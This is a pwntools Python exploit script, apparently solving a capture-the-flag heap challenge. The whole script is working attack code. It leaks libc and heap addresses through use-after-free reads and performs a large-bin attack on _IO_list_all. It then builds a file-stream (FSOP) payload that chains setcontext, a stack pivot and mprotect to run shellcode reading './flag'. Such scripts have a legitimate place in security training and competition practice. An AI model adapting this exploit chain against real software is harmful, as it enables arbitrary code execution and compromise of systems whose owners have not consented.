from pwn import *

BIN  = "./main_patched"
LIBC = "./libc.so.6"

context.binary = BIN
context.arch   = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
p    = process(BIN)
libc = ELF(LIBC)

def create(idx, size):
    p.sendline(b"1"); p.recvuntil(b": \n"); p.sendline(str(idx).encode())
    p.recvuntil(b": \n"); p.sendline(str(size).encode())
    p.recvuntil(b"choose? \n")

def edit(idx, data):
    p.sendline(b"2"); p.recvuntil(b": \n"); p.sendline(str(idx).encode())
    p.recvuntil(b": \n"); p.send(data)
    p.recvuntil(b"choose? \n")

def delete(idx):
    p.sendline(b"3"); p.recvuntil(b": \n"); p.sendline(str(idx).encode())
    p.recvuntil(b"choose? \n")

def show(idx):
    p.sendline(b"4"); p.recvuntil(b": \n"); p.sendline(str(idx).encode())
    leak = p.recvn(8)
    p.recvuntil(b"choose? \n")
    return leak


p.recvuntil(b"choose? \n")

for i in range(5): create(i, 1500)
delete(2)
print("ptr : ", u64(show(2)))
libc.address = u64(show(2)) - 0x203b20
log.success(f"Libc Base: {hex(libc.address)}")
create(2, 1500)

create(5, 0x58)
delete(5)
heap_leak = u64(show(5).ljust(8, b"\x00"))
heap_base = (heap_leak << 12) & ~0xfff
log.success(f"Heap Base: {hex(heap_base)}")

for i in range(6, 13): create(i, 0x428); delete(i)
for i in range(13, 20): create(i, 0x418); delete(i)

create(6, 0x428)
create(7, 0x18)
create(8, 0x900)
create(9, 0x418)
create(10, 0x18)
chunk9_user = heap_base + 0x60c0


wide_data_struct = chunk9_user + 0x100
wide_vtable_ptr  = chunk9_user + 0x1f8
fake_rsp         = chunk9_user + 0x2b0  # location of fake stack on the heap


setcontext   = libc.sym['setcontext'] + 61
print("context set to:", hex(setcontext))

mprotect     = libc.sym['mprotect']
print("mprotect at:", hex(mprotect))

pop_rdi      = libc.address + 0x10f75b
rdx_gadget   = libc.address + 0x1303d5 # mov rdx, rax; call [rbx+0x28] 


shellcode_off = 0x2d0  
flag_str_off  = 0x380  
read_buf_off  = 0x390  

shellcode_loc = chunk9_user + shellcode_off
flag_str_loc  = chunk9_user + flag_str_off
read_buf_loc  = chunk9_user + read_buf_off


fsop_payload = flat({
    
0x10: 0,                         # _IO_write_base
0x18: setcontext,                # _IO_write_ptr 
0x78: chunk9_user,               # _lock 
0x90: wide_data_struct,          # _wide_data pointer
0xb0: p32(0),                    # _mode
0xc8: libc.sym['_IO_wfile_jumps'], # vtable

  
0x118: 0,                        # _IO_write_base
0x120: 1,                        # _IO_write_ptr
0x130: 0,                        # _IO_buf_base
0x1e0: wide_vtable_ptr,          # _wide_vtable pointer

   
# RDI, RSI, RDX setup for mprotect call
0x1f8 + 0x60: 0,                 # R15
0x1f8 + 0x68: rdx_gadget,        # RDI
    
    
0x1f8 + 0x70: 0x10000,           # RSI
    
0x1f8 + 0x78: 0,                 # RBP
0x1f8 + 0x80: 0,                 # RBX 
0x1f8 + 0x88: 7,                 # RDX 
0x1f8 + 0xA0: fake_rsp,          # RSP Stack Pivot to heap
0x1f8 + 0xA8: pop_rdi,           # RCX ( pop rdi; ret)

0x2b0: [heap_base, mprotect, shellcode_loc],
    
    
shellcode_off: asm(shellcraft.cat("./flag")),               # Shellcode at 0x2d0
           
    
}, filler=b"\x00")


log.info(f"Shellcode Location: {hex(shellcode_loc)}")



edit(9, fsop_payload)

delete(6); create(11, 0x900); delete(9)
print("libc sym['_IO_list_all']:",)
print(hex(libc.sym['_IO_list_all']))
edit(6, flat({ 0x18: libc.sym['_IO_list_all'] - 0x20 }, filler=b"\x00"))
create(12, 0x438)

# repair just in case the large bin attack messed uo the chunk
edit(9, fsop_payload)


wdoalloc_addr = libc.sym['_IO_wdoallocbuf']
log.info(f"wdoallocbuf address: {hex(wdoalloc_addr)}")
# pause()
# gdb.attach(p)

p.interactive()

# chunk9_user - 0x10 = FILE base
# chunk9_user        = FILE + 0x10


